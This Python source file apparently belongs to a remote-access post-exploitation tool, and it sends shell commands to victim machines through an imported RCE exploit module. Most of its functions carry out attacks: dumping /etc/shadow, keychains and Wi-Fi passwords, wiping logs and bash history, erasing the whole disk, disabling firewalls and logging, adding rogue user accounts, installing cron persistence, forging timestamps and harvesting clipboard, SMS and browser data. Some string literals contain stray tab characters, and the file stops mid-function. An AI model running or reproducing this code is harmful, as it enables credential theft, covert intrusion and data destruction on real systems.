import os
import time
from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from rce_exploit import RCEExploit

console = Console()

class AdvancedCommands:
    @staticmethod
    def extract_passwords(ip, port):
        """Extract passwords from the target device."""
        try:
            command = "cat /etc/shadow || find / -name *.keychain 2>/dev/null || security dump-keychain 2>/dev/null"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success' and result['response']:
                os.makedirs("Download", exist_ok=True)
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                filename = f"Download/passwords_{timestamp}.txt"
                with open(filename, "w") as f:
                    f.write(result['response'])
                console.print(f"[bold green][Advanced] Passwords saved to {filename}[/bold green]")
                return {'status': 'success', 'filename': filename}
            else:
                console.print(f"[bold red][Advanced] Failed to extract passwords: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Advanced] Password extraction error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def clearev(ip, port):
        """Clear event logs on the target device."""
        try:
            command = "rm -rf /var/log/* || echo > /var/log/syslog || log rotate"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][Advanced] Event logs cleared successfully[/bold green]")
                return {'status': 'success'}
            else:
                console.print(f"[bold red][Advanced] Failed to clear event logs: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Advanced] Event log clear error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}

    @staticmethod
    def screenshot(ip, port):
        """Capture a screenshot from the target device."""
        return RCEExploit.capture_screenshot(ip, port)

    @staticmethod
    def background(ip, port):
        """Move session to background (simulated by storing session info)."""
        console.print("[bold yellow][Advanced] Session moved to background (simulated)[/bold yellow]")
        return {'status': 'success', 'info': 'Session backgrounded'}

    @staticmethod
    def sessions(ip, port, session_id):
        """Switch to a specific session (simulated)."""
        console.print(f"[bold green][Advanced] Switched to session {session_id} (simulated)[/bold green]")
        return {'status': 'success', 'info': f'Session {session_id}'}

    @staticmethod
    def format_device(ip, port):
        """Format the target device (DANGEROUS OPERATION)."""
        if not Confirm.ask("[bold red]WARNING: Formatting will erase all data on the device. Continue?[/bold red]", default=False):
            console.print("[bold yellow][Advanced] Format operation cancelled[/bold yellow]")
            return {'status': 'error', 'error': 'Operation cancelled'}
        try:
            command = "rm -rf / --no-preserve-root || format_device"
            result = RCEExploit.execute_rce(ip, port, command)
            if result['status'] == 'success':
                console.print(f"[bold green][Advanced] Device format initiated[/bold green]")
                return {'status': 'success'}
            else:
                console.print(f"[bold red][Advanced] Failed to format device: {result.get('error', 'No response')}[/bold red]")
                return {'status': 'error', 'error': result.get('error', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Advanced] Format error: {e}[/bold red]")
            return {'status': 'error', 'error': str(e)}
            


    @staticmethod
    def clear_bash_history(ip, port):
        """Clear bash command history on the target device."""
        try:
            command = "echo \"\" > ~/.bash_history && history -c && rm -f ~/.bash_history"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print("[bold green][Advanced] Bash history cleared successfully[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to clear bash history: {result.get('error', 'No response')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Bash history clear error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def disable_logging(ip, port):
        """Attempt to disable system logging services (simulation)."""
        try:
            # Commands are illustrative for simulation
            command = "systemctl stop rsyslog || service syslog stop || launchctl unload /System/Library/LaunchDaemons/com.apple.syslogd.plist"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print("[bold green][Advanced] Attempted to disable logging services (simulated)[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to disable logging: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Disable logging error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def modify_timestamps(ip, port, file_path):
        """Modify timestamps (access, modify) of a specific file."""
        try:
            # Use a reference time or a specific date if needed
            command = f"touch -a -m -t 202001010000 {file_path}"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print(f"[bold green][Advanced] Timestamps modified for {file_path}[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to modify timestamps: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Timestamp modification error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def shred_file(ip, port, file_path):
        """Securely delete a file (simulation using shred if available)."""
        try:
            command = f"shred -u -z -n 5 {file_path} || rm -f {file_path}" # Fallback to rm
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print(f"[bold green][Advanced] File {file_path} securely deleted (simulated)[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to shred file: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] File shredding error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def hide_process(ip, port, pid):
        """Attempt to hide a process by PID (simulation)."""
        # This is highly OS-dependent and often requires root/kernel modules
        console.print(f"[bold yellow][Advanced] Simulating attempt to hide process PID {pid}. This is complex and often not feasible via simple RCE.[/bold yellow]")
        # Example (conceptual, likely won't work directly):
        # command = f"renice -n 19 -p {pid} && echo hide > /proc/{pid}/status" 
        return {"status": "simulated", "info": f"Attempted to hide process {pid}"}

    @staticmethod
    def spoof_mac(ip, port, interface, new_mac):
        """Change the MAC address of a network interface (requires root)."""
        try:
            command = f"sudo ifconfig {interface} down && sudo ifconfig {interface} hw ether {new_mac} && sudo ifconfig {interface} up"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print(f"[bold green][Advanced] MAC address for {interface} spoofed to {new_mac}[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to spoof MAC address: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] MAC spoofing error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def change_hostname(ip, port, new_hostname):
        """Change the device hostname (requires root)."""
        try:
            command = f"sudo hostnamectl set-hostname {new_hostname} || sudo scutil --set HostName {new_hostname}"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print(f"[bold green][Advanced] Hostname changed to {new_hostname}[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to change hostname: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Hostname change error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def get_clipboard(ip, port):
        """Retrieve clipboard content."""
        try:
            # Commands vary significantly between OS (pbpaste for macOS, xclip for Linux X11, etc.)
            command = "pbpaste || xclip -o -selection clipboard || cat /dev/clipboard"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"]:
                console.print(Panel(result["response"], title="Clipboard Content"))
                return {"status": "success", "content": result["response"]}
            else:
                console.print(f"[bold red][Advanced] Failed to get clipboard: {result.get(	'error	', 	'No response or empty	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or empty")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Get clipboard error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def set_clipboard(ip, port, text):
        """Set clipboard content."""
        try:
            # Ensure text is properly escaped for the shell
            escaped_text = text.replace("'", "'\\''") # Basic escaping for single quotes
            command = f"echo '{escaped_text}' | pbcopy || echo '{escaped_text}' | xclip -i -selection clipboard"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print("[bold green][Advanced] Clipboard content set successfully[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to set clipboard: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Set clipboard error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def lock_screen(ip, port):
        """Lock the device screen."""
        try:
            # OS-specific commands
            command = "osascript -e 'tell application \"System Events\" to keystroke \"q\" using {control down, command down}' || gnome-screensaver-command -l || loginctl lock-session"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print("[bold green][Advanced] Screen lock command sent[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to lock screen: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Lock screen error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def play_sound(ip, port, file_path_on_target):
        """Play an audio file on the target device."""
        try:
            # Assumes a command-line audio player is available (e.g., afplay, paplay, aplay)
            command = f"afplay {file_path_on_target} || paplay {file_path_on_target} || aplay {file_path_on_target}"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print(f"[bold green][Advanced] Attempted to play sound file: {file_path_on_target}[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to play sound: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Play sound error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def get_contacts(ip, port):
        """Retrieve contacts list (highly platform-specific, simulation)."""
        try:
            # Requires specific framework access (e.g., Contacts framework on iOS/macOS)
            # Simulation: Look for common database files
            command = "find / -name 'Contacts.sqlite' -o -name 'AddressBook.sqlitedb' 2>/dev/null || echo 'Contacts retrieval simulated'"
            result = RCEExploit.execute_rce(ip, port, command)
            console.print(f"[bold blue][Advanced] Contacts retrieval simulation result: {result.get('response', 'No response')}[/bold blue]")
            # In a real scenario, would need to parse the DB
            return {"status": "simulated", "info": result.get('response', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Advanced] Get contacts error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def get_call_log(ip, port):
        """Retrieve call log (highly platform-specific, simulation)."""
        try:
            # Requires specific framework access
            # Simulation: Look for common database files
            command = "find / -name 'call_history.db' -o -name 'CallHistory.storedata' 2>/dev/null || echo 'Call log retrieval simulated'"
            result = RCEExploit.execute_rce(ip, port, command)
            console.print(f"[bold blue][Advanced] Call log retrieval simulation result: {result.get('response', 'No response')}[/bold blue]")
            # In a real scenario, would need to parse the DB
            return {"status": "simulated", "info": result.get('response', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Advanced] Get call log error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def get_sms(ip, port):
        """Retrieve SMS messages (highly platform-specific, simulation)."""
        try:
            # Requires specific framework access
            # Simulation: Look for common database files
            command = "find / -name 'sms.db' 2>/dev/null || echo 'SMS retrieval simulated'"
            result = RCEExploit.execute_rce(ip, port, command)
            console.print(f"[bold blue][Advanced] SMS retrieval simulation result: {result.get('response', 'No response')}[/bold blue]")
            # In a real scenario, would need to parse the DB
            return {"status": "simulated", "info": result.get('response', 'No response')}
        except Exception as e:
            console.print(f"[bold red][Advanced] Get SMS error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def send_sms(ip, port, recipient, message):
        """Send an SMS message (highly platform-specific, requires special permissions/APIs)."""
        # This is extremely unlikely via simple RCE, purely conceptual simulation
        console.print(f"[bold yellow][Advanced] Simulating sending SMS to {recipient}. This requires high privileges and specific APIs, not typically possible via basic RCE.[/bold yellow]")
        # command = f"send_sms_command --to {recipient} --body \"{message}\"" # Hypothetical command
        return {"status": "simulated", "info": f"Simulated sending SMS to {recipient}"}





    @staticmethod
    def disable_firewall(ip, port):
        """Attempt to disable the firewall (requires root)."""
        try:
            # Commands for different firewalls (ufw, iptables, pfctl)
            command = "sudo ufw disable || sudo iptables -F || sudo pfctl -d"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print("[bold green][Advanced] Attempted to disable firewall[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to disable firewall: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Disable firewall error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def enable_ssh(ip, port):
        """Attempt to enable SSH service (requires root)."""
        try:
            command = "sudo systemctl enable ssh --now || sudo service ssh start || sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print("[bold green][Advanced] Attempted to enable SSH service[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to enable SSH: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Enable SSH error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def get_wifi_passwords(ip, port):
        """Attempt to retrieve saved Wi-Fi passwords (OS-specific, requires root)."""
        try:
            # Example for macOS and Linux (NetworkManager)
            command = "security find-generic-password -ga \"AirPort\" /Library/Keychains/System.keychain || sudo grep psk= /etc/NetworkManager/system-connections/*"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"]:
                os.makedirs("Download", exist_ok=True)
                timestamp = time.strftime("%Y%m%d_%H%M%S")
                filename = f"Download/wifi_passwords_{timestamp}.txt"
                with open(filename, "w") as f:
                    f.write(result["response"])
                console.print(f"[bold green][Advanced] Potential Wi-Fi passwords saved to {filename}[/bold green]")
                return {"status": "success", "filename": filename}
            else:
                console.print(f"[bold red][Advanced] Failed to retrieve Wi-Fi passwords: {result.get(	'error	', 	'No response or not found	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or not found")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Wi-Fi password retrieval error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def dump_process_memory(ip, port, pid):
        """Attempt to dump the memory of a specific process (requires root/debug privileges)."""
        try:
            # Uses gcore if available
            dump_file = f"/tmp/process_{pid}_dump.core"
            command = f"gcore -o {dump_file} {pid} || echo \"Memory dump simulated for PID {pid}\""
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print(f"[bold green][Advanced] Attempted memory dump for PID {pid} (check {dump_file} on target)[/bold green]")
                # Potentially add a download step here if needed
                return {"status": "success", "dump_path": dump_file}
            else:
                console.print(f"[bold red][Advanced] Failed to dump process memory: {result.get(	'error	', 	'No response or gcore failed	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or gcore failed")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Process memory dump error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def escalate_privileges(ip, port):
        """Attempt common privilege escalation techniques (simulation)."""
        console.print("[bold yellow][Advanced] Simulating privilege escalation attempts...[/bold yellow]")
        # This would involve checking for SUID binaries, vulnerable kernel versions, misconfigurations etc.
        # Example check (not an exploit itself):
        command = "find / -perm -4000 -type f 2>/dev/null || uname -a"
        result = RCEExploit.execute_rce(ip, port, command)
        console.print(f"[bold blue][Simulate] Privesc check output: {result.get(	'response	', 	'No response	')}[/bold blue]")
        return {"status": "simulated", "info": "Checked for potential privesc vectors", "details": result.get("response", "")}

    @staticmethod
    def establish_persistence(ip, port, method="cron"):
        """Attempt to establish persistence (simulation)."""
        console.print(f"[bold yellow][Advanced] Simulating persistence establishment via {method}...[/bold yellow]")
        # Example using cron (requires appropriate permissions)
        payload_command = "echo \"Persistence Payload Executed\" > /tmp/persistence_check.txt" # Replace with actual payload
        if method == "cron":
            command = f"(crontab -l 2>/dev/null; echo \"* * * * * {payload_command}\") | crontab -"
        elif method == "launchd": # macOS
            # Creating plist files is more complex
            command = "echo \"Simulating launchd persistence setup\""
        else:
            command = "echo \"Unknown persistence method\""
        
        result = RCEExploit.execute_rce(ip, port, command)
        if result["status"] == "success":
            console.print(f"[bold green][Simulate] Persistence attempt via {method} command sent.[/bold green]")
            return {"status": "simulated", "method": method}
        else:
            console.print(f"[bold red][Simulate] Failed persistence attempt: {result.get(	'error	', 	'No response	')}[/bold red]")
            return {"status": "error", "error": result.get("error", "No response")}

    @staticmethod
    def execute_swift_command(ip, port, swift_command):
        """Execute a command using the previously installed simulated Swift app."""
        try:
            # Assumes the simulated app is at /tmp/simulated_swift_app.swift and can be run with swift
            target_path = "/tmp/simulated_swift_app.swift"
            # Modify the swift code execution to pass the command
            # This is a simplified simulation; real IPC would be needed.
            # We simulate by invoking the swift interpreter with the command as an argument (if the swift code was designed to handle it)
            # For this example, we just run the script again and pretend it executes the command.
            command = f"swift {target_path} \"{swift_command}\"" # Pass command as argument
            
            console.print(f"[bold blue][Simulate] Sending command 	'{swift_command}	' to simulated Swift app...[/bold blue]")
            result = RCEExploit.execute_rce(ip, port, command)
            
            if result["status"] == "success":
                console.print(f"[bold green][Simulate] Swift app command execution simulated. Output: {result.get(	'response	', 	'No output	')}[/bold green]")
                return {"status": "success", "output": result.get("response", "No output")}
            else:
                console.print(f"[bold red][Simulate] Failed to execute Swift app command: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Simulate] Swift command execution error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def inject_shellcode(ip, port, shellcode_hex):
        """Attempt to inject and execute raw shellcode (highly advanced, simulation)."""
        console.print(f"[bold yellow][Advanced] Simulating shellcode injection. This is highly complex and architecture-dependent.[/bold yellow]")
        # This would typically involve finding a vulnerable process, attaching, allocating memory, writing shellcode, and changing execution flow.
        # Simulation: Echo the intent.
        command = f"echo \"Simulating injection of shellcode: {shellcode_hex[:20]}...\""
        result = RCEExploit.execute_rce(ip, port, command)
        return {"status": "simulated", "info": "Shellcode injection simulated"}

    @staticmethod
    def bypass_av(ip, port):
        """Simulate techniques to bypass Antivirus detection."""
        console.print(f"[bold yellow][Advanced] Simulating AV bypass techniques...[/bold yellow]")
        # Techniques: Obfuscation, encryption, process hollowing, in-memory execution, etc.
        # Simulation: Run a command that might be flagged or try to stop AV service.
        command = "ps aux | grep -i \"antivirus\" || echo \"AV bypass simulation command executed\""
        result = RCEExploit.execute_rce(ip, port, command)
        console.print(f"[bold blue][Simulate] AV bypass check/action output: {result.get(	'response	', 	'No response	')}[/bold blue]")
        return {"status": "simulated", "info": "AV bypass techniques simulated"}

    @staticmethod
    def port_scan_local(ip, port, target_ip="127.0.0.1", ports="1-1024"):
        """Perform a port scan from the target machine to another host (e.g., localhost)."""
        try:
            # Use netcat or nmap if available on target
            command = f"nc -z -v {target_ip} {ports} 2>&1 || nmap -p {ports} {target_ip} || echo \"Port scan simulated for {target_ip}:{ports}\""
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print(f"[bold green][Advanced] Local port scan initiated from target. Output:[/bold green]\n{result.get(	'response	', 	'No detailed output	')}")
                return {"status": "success", "output": result.get("response", "")}
            else:
                console.print(f"[bold red][Advanced] Failed to initiate local port scan: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Local port scan error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}





    @staticmethod
    def get_browser_history(ip, port):
        """Attempt to retrieve browser history (simulation, looks for common DB files)."""
        try:
            # Common locations for Chrome, Firefox, Safari history
            command = "find ~ / -name \"History\" -o -name \"places.sqlite\" -o -name \"History.db\" 2>/dev/null || echo \"Browser history retrieval simulated\""
            result = RCEExploit.execute_rce(ip, port, command)
            console.print(f"[bold blue][Advanced] Browser history simulation result: {result.get(	'response	', 	'No response	')}[/bold blue]")
            # Real implementation would require parsing these files
            return {"status": "simulated", "info": result.get("response", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Get browser history error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def get_installed_apps(ip, port):
        """List installed applications (OS-specific)."""
        try:
            # macOS, Linux (dpkg/rpm), generic fallback
            command = "ls /Applications || dpkg -l || rpm -qa || find /usr/bin /bin /sbin /usr/sbin -type f -executable"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"]:
                console.print(Panel(result["response"], title="Installed Applications (Partial List)"))
                return {"status": "success", "apps_list": result["response"]}
            else:
                console.print(f"[bold red][Advanced] Failed to list installed apps: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Get installed apps error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def find_files_by_name(ip, port, name_pattern, search_path="/"):
        """Find files by name pattern."""
        try:
            command = f"find {search_path} -name \"{name_pattern}\" 2>/dev/null"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"]:
                console.print(Panel(result["response"], title=f"Files matching 	'{name_pattern}	'"))
                return {"status": "success", "files": result["response"]}
            else:
                console.print(f"[bold red][Advanced] Failed to find files by name: {result.get(	'error	', 	'No response or not found	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or not found")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Find files by name error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def find_files_by_content(ip, port, content_pattern, search_path="/"):
        """Find files containing specific content pattern (uses grep)."""
        try:
            # Be cautious with search_path, / can be very slow
            command = f"grep -r -l \"{content_pattern}\" {search_path} 2>/dev/null"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"]:
                console.print(Panel(result["response"], title=f"Files containing 	'{content_pattern}	'"))
                return {"status": "success", "files": result["response"]}
            else:
                console.print(f"[bold red][Advanced] Failed to find files by content: {result.get(	'error	', 	'No response or not found	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or not found")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Find files by content error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def get_process_list(ip, port):
        """Get the list of running processes."""
        try:
            command = "ps aux || tasklist"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"]:
                console.print(Panel(result["response"], title="Running Processes"))
                return {"status": "success", "processes": result["response"]}
            else:
                console.print(f"[bold red][Advanced] Failed to get process list: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Get process list error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def kill_process_by_pid(ip, port, pid):
        """Kill a process by its PID."""
        try:
            command = f"kill -9 {pid} || taskkill /F /PID {pid}"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print(f"[bold green][Advanced] Sent kill signal to PID {pid}[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to kill process PID {pid}: {result.get(	'error	', 	'No response or process not found	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or process not found")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Kill process PID error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def kill_process_by_name(ip, port, process_name):
        """Kill processes by name."""
        try:
            command = f"pkill -f {process_name} || taskkill /F /IM {process_name}"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print(f"[bold green][Advanced] Sent kill signal to processes named 	'{process_name}	'[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to kill process by name 	'{process_name}	': {result.get(	'error	', 	'No response or process not found	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or process not found")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Kill process name error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def get_user_accounts(ip, port):
        """List user accounts on the system."""
        try:
            command = "cat /etc/passwd || dscl . list /Users || net user"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"]:
                console.print(Panel(result["response"], title="User Accounts"))
                return {"status": "success", "users": result["response"]}
            else:
                console.print(f"[bold red][Advanced] Failed to get user accounts: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Get user accounts error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def add_user_account(ip, port, username, password):
        """Add a new user account (requires root)."""
        try:
            # Ensure password complexity if needed, escape special chars
            command = f"sudo useradd -m -p $(openssl passwd -1 	'{password}	') {username} || sudo dscl . -create /Users/{username} && sudo dscl . -create /Users/{username} UserShell /bin/bash && sudo dscl . -create /Users/{username} RealName 	'{username}	' && sudo dscl . -create /Users/{username} UniqueID 50X && sudo dscl . -create /Users/{username} PrimaryGroupID 20 && sudo dscl . -passwd /Users/{username} 	'{password}	' || sudo net user {username} {password} /add"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print(f"[bold green][Advanced] Attempted to add user account 	'{username}	'[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to add user account: {result.get(	'error	', 	'No response or permission denied	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or permission denied")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Add user error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def delete_user_account(ip, port, username):
        """Delete a user account (requires root)."""
        try:
            command = f"sudo userdel -r {username} || sudo dscl . -delete /Users/{username} || sudo net user {username} /delete"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print(f"[bold green][Advanced] Attempted to delete user account 	'{username}	'[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to delete user account: {result.get(	'error	', 	'No response or permission denied	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or permission denied")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Delete user error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def get_network_config(ip, port):
        """Get network interface configuration."""
        try:
            command = "ip addr || ifconfig -a"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"]:
                console.print(Panel(result["response"], title="Network Configuration"))
                return {"status": "success", "config": result["response"]}
            else:
                console.print(f"[bold red][Advanced] Failed to get network config: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Get network config error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def get_routing_table(ip, port):
        """Get the system routing table."""
        try:
            command = "ip route || route -n || netstat -rn"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"]:
                console.print(Panel(result["response"], title="Routing Table"))
                return {"status": "success", "routes": result["response"]}
            else:
                console.print(f"[bold red][Advanced] Failed to get routing table: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Get routing table error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def get_arp_table(ip, port):
        """Get the system ARP table."""
        try:
            command = "ip neigh || arp -a"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success" and result["response"]:
                console.print(Panel(result["response"], title="ARP Table"))
                return {"status": "success", "arp_table": result["response"]}
            else:
                console.print(f"[bold red][Advanced] Failed to get ARP table: {result.get(	'error	', 	'No response	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response")}
        except Exception as e:
            console.print(f"[bold red][Advanced] Get ARP table error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def dns_spoof_simulation(ip, port, target_domain, spoof_ip):
        """Simulate DNS spoofing by modifying /etc/hosts (requires root)."""
        try:
            # Ensure entry doesn't already exist or handle update
            command = f"echo 	'{spoof_ip}	 {target_domain}	' | sudo tee -a /etc/hosts"
            result = RCEExploit.execute_rce(ip, port, command)
            if result["status"] == "success":
                console.print(f"[bold green][Advanced] Attempted to add entry to /etc/hosts for {target_domain} -> {spoof_ip}[/bold green]")
                return {"status": "success"}
            else:
                console.print(f"[bold red][Advanced] Failed to modify /etc/hosts: {result.get(	'error	', 	'No response or permission denied	')}[/bold red]")
                return {"status": "error", "error": result.get("error", "No response or permission denied")}
        except Exception as e:
            console.print(f"[bold red][Advanced] DNS spoof simulation error: {e}[/bold red]")
            return {"status": "error", "error": str(e)}

    @staticmethod
    def arp_poison_simulation(ip, port, target_ip, gateway_ip):
        """Informational simulation of ARP poisoning concept."""
